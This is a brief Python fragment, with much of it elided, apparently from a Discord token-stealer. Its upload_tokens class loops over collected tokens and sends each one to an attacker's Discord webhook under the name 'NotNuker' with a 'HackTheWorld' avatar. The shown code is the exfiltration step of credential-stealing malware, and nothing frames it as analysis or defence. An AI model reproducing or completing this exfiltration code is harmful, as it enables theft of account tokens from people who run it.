...
class upload_tokens:
    ...
    def upload(self):
        ...
        for token in self.tokens:
            ...
            self.webhook.send(embed=embed, username="NotNuker", avatar_url="https://cdn.discordapp.com/attachments/1026833221515751465/1077465466202751087/HackTheWorld.png")
